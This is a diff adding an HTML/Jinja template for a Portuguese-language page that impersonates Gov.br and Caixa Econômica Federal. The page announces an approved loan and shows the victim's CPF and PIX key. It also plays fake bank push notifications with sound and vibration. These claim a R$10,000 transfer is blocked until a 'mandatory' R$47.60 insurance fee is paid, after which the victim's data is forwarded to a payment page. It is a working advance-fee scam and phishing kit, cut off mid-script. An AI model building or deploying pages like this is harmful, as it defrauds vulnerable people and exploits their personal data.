@@ -1,0 +1,987 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "qs9me5web3"); </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: transparent;
+        }
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+        }
+
+        @keyframes slideLeft {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(-100%);
+                opacity: 0;
+            }
+        }
+
+        @keyframes slideRight {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+        }
+        .notification {
+            position: fixed;
+            top: 0px;
+            left: 0;
+            right: 0;
+            margin-left: auto;
+            margin-right: auto;
+            z-index: 9999;
+            width: calc(100% - 30px);
+            max-width: 420px;
+            transition: transform 0.2s ease, opacity 0.2s ease;
+            cursor: grab;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(0, 0, 0, 0.06);
+        }
+
+        /* Define fonte Inter para elementos dentro das notificações */
+        .notification * {
+            font-family: 'Inter', sans-serif;
+        }
+        .notification:active {
+            cursor: grabbing;
+        }
+        /* Initial notification state */
+        #notification1 {
+            opacity: 0;
+            transform: translateY(-100%);
+        }
+        #notification2 {
+            opacity: 0;
+            transform: translateY(-100%);
+        }
+        .notification.hide-up {
+            animation: slideUp 0.3s ease-in forwards;
+        }
+        .notification.hide-left {
+            animation: slideLeft 0.3s ease-in forwards;
+        }
+        .notification.hide-right {
+            animation: slideRight 0.3s ease-in forwards;
+        }
+        .button-text-shadow {
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        .button-shadow {
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .button-click {
+            transform: scale(0.95);
+            transition: transform 0.1s;
+        }
+    </style>
+    <meta http-equiv="Expires" content="0">
+    <title>CONTRATO DE EMPRÉSTIMO - CAIXA</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
+            font-weight: 800;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            margin-top: 0;
+            padding-top: 100px;
+            font-family: 'Rawline', sans-serif;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            height: 35px;
+        }
+        .header-icons {
+            display: flex;
+            align-items: center;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #1351b4;
+            margin-left: 15px;
+            cursor: pointer;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        .user-info {
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .user-info-header {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #1351b4;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 0.5rem;
+        }
+        .user-info-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+        .user-info-item {
+            margin-bottom: 0.5rem;
+        }
+        .user-info-label {
+            font-weight: 500;
+            color: #666;
+            font-size: 0.9rem;
+        }
+        .user-info-value {
+            font-weight: 600;
+            color: #333;
+        }
+        .alert-box {
+            background-color: rgba(250, 188, 20, 0.85);
+            color: #000;
+            border-radius: 5px;
+            padding: 1.2rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .alert-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            color: #8a6d07;
+        }
+        .alert-title i {
+            margin-right: 12px;
+            color: #8a6d07;
+        }
+        .alert-box p {
+            margin-bottom: 0;
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+        .alert-box strong {
+            font-weight: 700;
+            color: #000000;
+        }
+        .insurance-card {
+            background-color: #1451B4;
+            border-radius: 5px;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: white;
+        }
+        .insurance-header {
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .insurance-header i {
+            margin-right: 12px;
+        }
+        .insurance-price {
+            background-color: rgba(255, 255, 255, 0.15);
+            border-radius: 5px;
+            padding: 1rem;
+            margin: 1.2rem 0;
+            text-align: center;
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+        .insurance-details {
+            margin-top: 1.2rem;
+        }
+        .insurance-features {
+            margin-top: 1rem;
+            padding-left: 1.5rem;
+        }
+        .insurance-features li {
+            margin-bottom: 0.8rem;
+            position: relative;
+        }
+        .insurance-features li:before {
+            content: "✓";
+            position: absolute;
+            left: -1.2rem;
+            color: #ffffff;
+            font-weight: bold;
+        }
+        .toggle-container {
+            margin-top: 1.2rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            padding: 1rem;
+        }
+        .toggle-text {
+            margin-bottom: 12px;
+            font-size: 0.95rem;
+            line-height: 1.4;
+        }
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 30px;
+            margin-top: 10px;
+            align-self: flex-start;
+        }
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.25);
+            transition: .4s;
+            border-radius: 34px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: #ffffff;
+        }
+        input:checked + .slider:before {
+            transform: translateX(30px);
+            background-color: #1451B4;
+        }
+        .btn-contract {
+            display: block;
+            width: 100%;
+            padding: 1.2rem;
+            background-color: #48AD45;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.3s ease;
+            margin-top: 1.5rem;
+            text-decoration: none;
+            box-shadow: 0 3px 5px rgba(0, 0, 0, 0.2);
+        }
+        .btn-contract:hover {
+            background-color: #2d7a2a;
+        }
+        .btn-contract:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .disclaimer {
+            font-size: 0.85rem;
+            color: #666;
+            margin-top: 1.2rem;
+            text-align: center;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 1.2rem;
+            margin-top: 1.5rem;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: #1351b4;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            background-color: #1351b4;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            margin-top: 30px;
+            width: 100%;
+            font-size: 14px;
+            box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+        }
+        .footer-logo {
+            height: 25px;
+            margin-bottom: 5px;
+        }
+        @media (max-width: 768px) {
+            .user-info-content {
+                grid-template-columns: 1fr;
+            }
+            .container {
+                padding: 0 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="notification1" class="mx-auto bg-white rounded-3xl p-3 shadow-lg notification" style="display: none;">
+        <div class="flex justify-between items-start">
+            <div class="flex-grow pr-2">
+                <div class="flex items-center mb-1 pl-2">
+                    <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
+                        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4v4sz_PsGCe98ocnEokjkWgfBgThfi70u-36k6j3f81st-IBaIbW2InDiKlugsqyqTxkVApq4dcgSpFXVDrdNsla1jgm7Da8DyEfZjf1JNveDfj4S80-xIiX9Yy2D5Tx5or-Psg/s1600/BB+logo.jpg" alt="Bank logo" class="w-full h-full object-cover bank-image">
+                    </div>
+                    <span class="text-gray-700 text-sm" id="bankName1">Banco do Brasil • agora <i class="fas fa-chevron-down text-xs"></i></span>
+                </div>
+                <div class="text-black text-lg font-bold mb-0 pl-2">PIX no valor de <span class="dynamic-amount">R$10.000,00</span></div>
+            </div>
+            <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4v4sz_PsGCe98ocnEokjkWgfBgThfi70u-36k6j3f81st-IBaIbW2InDiKlugsqyqTxkVApq4dcgSpFXVDrdNsla1jgm7Da8DyEfZjf1JNveDfj4S80-xIiX9Yy2D5Tx5or-Psg/s1600/BB+logo.jpg" alt="Bank logo" class="w-full h-full object-cover bank-image">
+            </div>
+        </div>
+        <div class="text-gray-600 text-sm w-full mt-0.5 pl-2 pr-2" style="word-break: break-word; max-width: 100%; line-height: 1.4; letter-spacing: -0.01em;">
+            CAIXA ECONÔMICA FEDERAL deseja transferir <span class="dynamic-amount">R$10.000,00</span> para sua conta <span id="bankText1">Banco do Brasil</span>. Você deseja aceitar?
+        </div>
+        <div class="flex justify-end mt-3 space-x-2 pl-2 pr-2">
+            <button id="acceptButton" class="bg-green-500 text-white text-sm px-5 py-2 rounded-lg hover:bg-green-600 transition duration-200 button-text-shadow button-shadow flex-grow">Aceitar</button>
+            <button id="rejectButton" class="bg-red-500 text-white text-sm px-5 py-2 rounded-lg hover:bg-red-600 transition duration-200 button-text-shadow button-shadow flex-grow">Recusar</button>
+        </div>
+    </div>
+
+    <!-- Second Notification -->
+    <div id="notification2" class="mx-auto bg-white rounded-3xl p-3 shadow-lg notification" style="display: none;">
+        <div class="flex justify-between items-start">
+            <div class="flex-grow pr-2">
+                <div class="flex items-center mb-1 pl-2">
+                    <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
+                        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4v4sz_PsGCe98ocnEokjkWgfBgThfi70u-36k6j3f81st-IBaIbW2InDiKlugsqyqTxkVApq4dcgSpFXVDrdNsla1jgm7Da8DyEfZjf1JNveDfj4S80-xIiX9Yy2D5Tx5or-Psg/s1600/BB+logo.jpg" alt="Bank logo" class="w-full h-full object-cover bank-image">
+                    </div>
+                    <span class="text-gray-700 text-sm" id="bankName2">Banco do Brasil • agora <i class="fas fa-chevron-down text-xs"></i></span>
+                </div>
+                <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden pl-2" style="text-overflow: ellipsis;">
+                    <span class="mr-2" style="font-size: 1.1em;">🚨</span>
+                    Transferência PIX não recebida
+                </div>
+            </div>
+            <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4v4sz_PsGCe98ocnEokjkWgfBgThfi70u-36k6j3f81st-IBaIbW2InDiKlugsqyqTxkVApq4dcgSpFXVDrdNsla1jgm7Da8DyEfZjf1JNveDfj4S80-xIiX9Yy2D5Tx5or-Psg/s1600/BB+logo.jpg" alt="Bank logo" class="w-full h-full object-cover bank-image">
+            </div>
+        </div>
+        <div class="text-gray-600 text-sm w-full mt-0.5 pl-2 pr-2" style="word-break: break-word; max-width: 100%; line-height: 1.4; letter-spacing: -0.01em;">
+            Não foi possível concluir o recebimento de <span class="dynamic-amount">R$10.000,00</span> via PIX. A Caixa Econômica Federal exige a contratação do seguro Prestamista para liberar o valor. Realize a contratação do seguro e receberemos a transferência.
+        </div>
+    </div>
+    <div class="header">
+        <img alt="Logo Gov.br" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-user-circle header-icon"></i>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="alert-box">
+            <div class="alert-title" style="color: #000000; text-align: center; justify-content: center;">
+                <i class="fas fa-exclamation-triangle" style="color: #000000;"></i>
+                <span>ATENÇÃO</span>
+            </div>
+            <p>Para <strong>liberar o empréstimo</strong>, é necessário contratar o <strong>seguro prestamista</strong> conforme determinação do <strong>Conselho Monetário Nacional</strong> (Resolução Nº 3.308 do BCB).</p>
+        </div>
+
+        <div class="insurance-card">
+            <div class="insurance-header">
+                <span><i class="fas fa-shield-alt"></i> EMPRÉSTIMO APROVADO</span>
+            </div>
+
+            <!-- Dados do Empréstimo dentro da insurance-card -->
+            <div class="user-info-content" style="margin-top: 1rem; padding: 1rem; background-color: rgba(255, 255, 255, 0.1); border-radius: 5px;">
+                <div class="user-info-item">
+                    <div class="user-info-label" style="color: rgba(255, 255, 255, 0.7);">Nome:</div>
+                    <div class="user-info-value" style="color: white; font-weight: 600;">{{ customer.nome }}</div>
+                </div>
+                <div class="user-info-item">
+                    <div class="user-info-label" style="color: rgba(255, 255, 255, 0.7);">CPF:</div>
+                    <div class="user-info-value" style="color: white; font-weight: 600;">{{ customer.cpf }}</div>
+                </div>
+                <div class="user-info-item">
+                    <div class="user-info-label" style="color: rgba(255, 255, 255, 0.7);">Valor do Empréstimo:</div>
+                    <div class="user-info-value" style="color: white; font-weight: 600;">R$ {{ customer.amount }}</div>
+                </div>
+                <div class="user-info-item">
+                    <div class="user-info-label" style="color: rgba(255, 255, 255, 0.7);">Prazo:</div>
+                    <div class="user-info-value" style="color: white; font-weight: 600;">{{ customer.term }} meses</div>
+                </div>
+                <div class="user-info-item">
+                    <div class="user-info-label" style="color: rgba(255, 255, 255, 0.7);">Chave PIX:</div>
+                    <div class="user-info-value" style="color: white; font-weight: 600;">{{ customer.pix_key }}</div>
+                </div>
+                <div class="user-info-item">
+                    <div class="user-info-label" style="color: rgba(255, 255, 255, 0.7);">Banco:</div>
+                    <div class="user-info-value" style="color: white; font-weight: 600;">{{ customer.bank }}</div>
+                </div>
+            </div>
+
+            <p style="margin-top: 1.5rem; font-weight: 600; font-size: 1.1rem;">Para concluir o processo e receber o empréstimo do programa Crédito do Trabalhador, é obrigatória a contratação do seguro prestamista.</p>
+
+            <h3 style="margin-top: 1.5rem; font-size: 1.1rem; font-weight: 600;">O que é o seguro prestamista?</h3>
+            <p style="margin-top: 0.5rem;">É um seguro que garante o pagamento do empréstimo em situações como:</p>
+
+            <ul class="insurance-features" style="margin-top: 0.8rem;">
+                <li>Morte</li>
+                <li>Invalidez</li>
+                <li>Perda involuntária de emprego</li>
+            </ul>
+
+            <p style="margin-top: 1rem;">Essa proteção é exigida pela Caixa Econômica Federal para o fechamento do contrato. Após o pagamento do seguro a Caixa Econômica Federal realizará a transferência do valor de R$ {{ "{:,.2f}".format(customer.amount|float).replace(",", "X").replace(".", ",").replace("X", ".") }} para sua conta.</p>
+
+            <div class="insurance-price">
+                Valor do Seguro: R$ 47,60 (pagamento único)
+            </div>
+
+            <div class="toggle-container">
+                <div class="toggle-text">Estou ciente que a contratação do seguro é obrigatória para liberação do empréstimo (clique no botão abaixo para aceitar os termos e prosseguir)</div>
+                <label class="switch">
+                    <input type="checkbox" id="insuranceToggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+
+        <button id="contractButton" class="btn-contract" disabled>Contratar Seguro</button>
+
+        <div class="loading" id="loadingIndicator">
+            <div class="spinner"></div>
+            <p>Processando sua solicitação...</p>
+        </div>
+
+        <p class="disclaimer">
+            Ao contratar o seguro, você autoriza o débito único de R$ 47,60 na mesma chave PIX cadastrada para recebimento do empréstimo.
+        </p>
+    </div>
+
+    <footer class="footer">
+        <p>©Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+                // Store user data in localStorage
+                const customerData = {
+                    nome: "{{ customer.nome }}",
+                    cpf: "{{ customer.cpf }}",
+                    phone: "{{ customer.phone }}",
+                    pix_key: "{{ customer.pix_key }}",
+                    bank: "{{ customer.bank }}",
+                    amount: Number("{{ customer.amount }}".replace(/[^0-9.]/g, '')),
+                    term: Number("{{ customer.term }}".replace(/[^0-9]/g, ''))
+                };
+                localStorage.setItem('customerData', JSON.stringify(customerData));
+
+                // Format and display amount in the dynamic-amount elements
+                const amountValue = Number("{{ customer.amount }}".replace(/[^0-9.]/g, ''));
+                document.querySelectorAll('.dynamic-amount').forEach(el => {
+                    el.textContent = amountValue.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+                });
+
+            const insuranceToggle = document.getElementById('insuranceToggle');
+            const contractButton = document.getElementById('contractButton');
+            const loadingIndicator = document.getElementById('loadingIndicator');
+
+            // Toggle button state based on checkbox
+            insuranceToggle.addEventListener('change', function() {
+                contractButton.disabled = !this.checked;
+                if (this.checked) {
+                    contractButton.style.opacity = '1';
+                    contractButton.style.cursor = 'pointer';
+                } else {
+                    contractButton.style.opacity = '0.5';
+                    contractButton.style.cursor = 'not-allowed';
+                }
+            });
+
+            // Contract button event
+            contractButton.addEventListener('click', function() {
+                // Show loading indicator
+                this.style.display = 'none';
+                loadingIndicator.style.display = 'block';
+
+                // Simulate processing delay
+                setTimeout(() => {
+                    // Prepare parameters for payment page (for insurance payment)
+                    const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+                    const params = new URLSearchParams({
+                        nome: customerData.nome || '',
+                        cpf: customerData.cpf || '',
+                        phone: customerData.phone || '',
+                        pix_key: customerData.pix_key || '',
+                        bank: customerData.bank || '',
+                        amount: '47.60',  // Fixed insurance amount
+                        source: 'insurance'
+                    });
+
+                    // Redirect to payment page for insurance payment
+                    window.location.href = '/payment?' + params.toString();
+                }, 2000);
+            });
+        });
+    </script>
+
+    <!-- Elementos de áudio para reprodução do som de notificação -->
+    <audio id="notificationSound1" preload="auto" style="display: none;">
+        <source src="{{ url_for('static', filename='audio/notification.mp3') }}" type="audio/mpeg">
+        <!-- Fallback para browsers que não suportam MP3 -->
+        Seu navegador não suporta o elemento de áudio.
+    </audio>
+    <audio id="notificationSound2" preload="auto" style="display: none;">
+        <source src="{{ url_for('static', filename='audio/notification.mp3') }}" type="audio/mpeg">
+        <!-- Fallback para browsers que não suportam MP3 -->
+        Seu navegador não suporta o elemento de áudio.
+    </audio>
+
+    <script>
+        // Função para vibrar o dispositivo
+        function vibrateDevice() {
+            if ("vibrate" in navigator) {
+                navigator.vibrate(200);
+            }
+        }
+
+        // Função para pré-carregar os sons de notificação
+        // Isso ajuda em dispositivosmóveis onde interação é necessária
+        function preloadSounds() {
+            // Carrega os dois sons de notificação
+            const sound1 = document.getElementById('notificationSound1');
+            const sound2 = document.getElementById('notificationSound2');
+
+            // Configura os sons para volume zero e tenta reproduzir/pausar rapidamente
+            // Isso efetivamente pré-carrega os sons em alguns navegadores
+            sound1.volume = 0;
+            sound2.volume = 0;
+
+            // Tenta reproduzir e pausar imediatamente (pré-carregamento)
+            try {
+                sound1.play().then(() => {
+                    sound1.pause();
+                    sound1.currentTime = 0;
+                    sound1.volume = 1; // Restaura o volume
+                    console.log("Som 1 pré-carregado com sucesso");
+                }).catch(e => console.log("Pré-carregamento do som 1 não é suportado neste navegador"));
+
+                sound2.play().then(() => {
+                    sound2.pause();
+                    sound2.currentTime = 0;
+                    sound2.volume = 1; // Restaura o volume
+                    console.log("Som 2 pré-carregado com sucesso");
+                }).catch(e => console.log("Pré-carregamento do som 2 não é suportado neste navegador"));
+            } catch (e) {
+                console.log("Pré-carregamento de áudio não suportado");
+            }
+        }
+
+        // Adiciona eventos de interação para pré-carregar sons
+        document.addEventListener('click', function() {
+            preloadSounds();
+        }, { once: true });
+
+        document.addEventListener('touchstart', function() {
+            preloadSounds();
+        }, { once: true });
+
+        // Método direto para tocar som
+        function playSound(id) {
+            try {
+                console.log(`Tentando tocar som direto: ${id}`);
+
+                // Usar o elemento de áudio específico
+                const audio = document.getElementById(id);
+
+                if (!audio) {
+                    console.error(`Elemento de áudio ${id} não encontrado`);
+                    return;
+                }
+
+                // Reinicia a posição e tenta reproduzir
+                audio.pause();
+                audio.currentTime = 0;
+
+                // Alguns navegadores móveis exigem que o usuário interaja com a página antes
+                // Aumentamos o volume para garantir que está audível
+                audio.volume = 1.0;
+
+                const promise = audio.play();
+
+                if (promise !== undefined) {
+                    promise.then(() => {
+                        console.log(`Som ${id} tocado com sucesso`);
+                    }).catch(err => {
+                        console.error(`Erro ao tocar som ${id}:`, err);
+
+                        // Tenta uma abordagem alternativa para iOS
+                        const audioUrl = audio.querySelector('source').src;
+                        const tempAudio = new Audio(audioUrl);
+                        tempAudio.play().catch(e => {
+                            console.error("Fallback de som também falhou:", e);
+                        });
+                    });
+                }
+            } catch (err) {
+                console.error("Erro ao tentar reproduzir som:", err);
+            }
+        }
+
+        // Função para reproduzir o som da primeira notificação
+        function playFirstNotificationSound() {
+            playSound('notificationSound1');
+        }
+
+        // Função para reproduzir o som da segunda notificação
+        function playSecondNotificationSound() {
+            playSound('notificationSound2');
+        }
+
+        // Atrasa a primeira notificação em 4 segundos
+        setTimeout(() => {
+            const notification1 = document.getElementById('notification1');
+            notification1.style.display = 'block';
+            notification1.style.animation = 'slideDown 0.3s ease-out forwards';
+            vibrateDevice();
+            playFirstNotificationSound(); // Reproduz o som quando a notificação aparecer
+        }, 4000);
+
+        // Função para obter a imagem do banco baseada no parâmetro 'bank' da URL
+        function getBankImage() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const bank = urlParams.get('bank');
+
+            // Mapeamento de bancos para suas respectivas imagens
+            const bankImages = {
+                'Nubank': 'https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png',
+                'Itau': 'https://upload.wikimedia.org/wikipedia/commons/2/2d/2023_Ita%C3%BA_Unibanco_Logo.png',
+                'Bradesco': 'https://media.licdn.com/dms/image/v2/C4E0BAQEXB9xussWsHQ/company-logo_200_200/company-logo_200_200/0/1680038081184/bradesco_logo?e=2147483647&v=beta&t=g_KrgasAdf1h-qhIvVQG3R5022A7UVAaAnuFYCNBqkc',
+                'Santander': 'https://i.pinimg.com/564x/e9/67/a4/e967a4935c65ed0da069364e952e4630.jpg',
+                'Caixa': 'https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg',
+                'Banco do Brasil': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4v4sz_PsGCe98ocnEokjkWgfBgThfi70u-36k6j3f81st-IBaIbW2InDiKlugsqyqTxkVApq4dcgSpFXVDrdNsla1jgm7Da8DyEfZjf1JNveDfj4S80-xIiX9Yy2D5Tx5or-Psg/s1600/BB+logo.jpg',
+                'Inter': 'https://i.ibb.co/04MjDYh/Design-sem-nome-5.png',
+                'C6': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAdb6wCFEOzVXR0WHXSOLsjjWTwWL0u1-FTw&s',
+                'PicPay': 'https://yt3.googleusercontent.com/cUdSm0KI0fN0sgr5Jb_DvkaQRuR5G9rl1ijX7MoUueMq2AVzNKdBqS_WNALQl9OTRyCviKFJQOs=s900-c-k-c0x00ffffff-no-rj',
+                'Neon': 'https://t.ctcdn.com.br/j48g27dg8ohgm7yzRap-mQEZkrQ=/i666960.jpeg',
+                'PagBank': 'https://ribnet.com.br/wp-content/uploads/2024/04/pagbank.png',
+                'BTG': 'https://yt3.googleusercontent.com/Ed7X0Y8r3IB2156vQXpSugZLU8tVOkejq8LG80w3P15u4SpExdUWAgvHKfK7VKSLKJ49SM2c=s900-c-k-c0x00ffffff-no-rj'
+            };
+
+            // Retorna a imagem correspondente ao banco ou a imagem padrão do Nubank
+            return bankImages[bank] || bankImages['Nubank'];
+        }
+
+        // Obtém os parâmetros da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const bankName = urlParams.get('bank') || 'Nubank';
+        const amountValue = urlParams.get('amount') || '10000';
+        const bankImage = getBankImage();
+
+        // Formata o valor para exibição (adiciona R$ e formata com pontos e vírgulas)
+        const formatCurrency = (value) => {
+            // Converte para número e formata com 2 casas decimais
+            const numValue = parseFloat(value);
+            return 'R$' + numValue.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+        };
+
+        const formattedAmount = formatCurrency(amountValue);
+
+        // Aplica a imagem do banco nas notificações
+        const bankImages = document.querySelectorAll('.bank-image');
+        bankImages.forEach(img => {
+            img.src = bankImage;
+        });
+
+        // Atualiza o nome do banco nos textos
+        document.getElementById('bankName1').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
+        document.getElementById('bankName2').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
+        document.getElementById('bankText1').textContent = bankName;
+
+        // Atualiza os valores monetários no texto
+        document.querySelectorAll('.dynamic-amount').forEach(el => {
+            el.textContent = formattedAmount;
+        });
+
+        const notification1 = document.getElementById('notification1');
+        const notification2 = document.getElementById('notification2');
+        const acceptButton = document.getElementById('acceptButton');
+        const rejectButton = document.getElementById('rejectButton');
+
+        function addClickEffect(button) {
+            button.addEventListener('mousedown', () => {
+                button.classList.add('button-click');
+            });
+            button.addEventListener('mouseup', () => {
+                button.classList.remove('button-click');
+            });
+            button.addEventListener('mouseleave', () => {
+                button.classList.remove('button-click');
+            });
+        }
+
+        addClickEffect(acceptButton);
+        addClickEffect(rejectButton);
+
+        acceptButton.addEventListener('click', () => {
+            // Animação para cima ao aceitar
+            notification1.classList.remove('hide-up', 'hide-left', 'hide-right');
+            notification1.classList.add('hide-up');
+            setTimeout(() => {
+                notification1.style.display = 'none';
+                setTimeout(() => {
+                    notification2.style.display = 'block';
+                    notification2.style.animation = 'slideDown 0.3s ease-out forwards';
+                    vibrateDevice();
+                    playSecondNotificationSound(); // Reproduz o som também na segunda notificação
+                    // Don't auto-hide notification2, keep it visible
+                }, 1000);
+            }, 300);
+        });
+
+        rejectButton.addEventListener('click', () => {
+            // Animação para a direita ao recusar
+            hideNotification(notification1, 'right');
+        });
+
+        function hideNotification(notification, direction = 'up') {
+            // Remova qualquer classe de animação existente
+            notification.classList.remove('hide-up', 'hide-left', 'hide-right');
+
+            // Adicione a classe de animação com base na direção do deslize
+            notification.classList.add(`hide-${direction}`);
+
+            // Remova o display após a animação terminar
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 300);
+        }
+
+        // Variáveis para controlar gestos de deslizar
+        let startY, moveY, startX, moveX;
+
+        function addSwipeToHide(notification) {
+            // Detector de evento de toque inicial
+            notification.addEventListener('touchstart', (e) => {
+                startY = e.touches[0].clientY;
+                startX = e.touches[0].clientX;
+            });
+
+            // Detector de movimento do toque
+            notification.addEventListener('touchmove', (e) => {
+                moveY = e.touches[0].clientY;
+                moveX = e.touches[0].clientX;
+
+                // Calcula distâncias vertical e horizontal
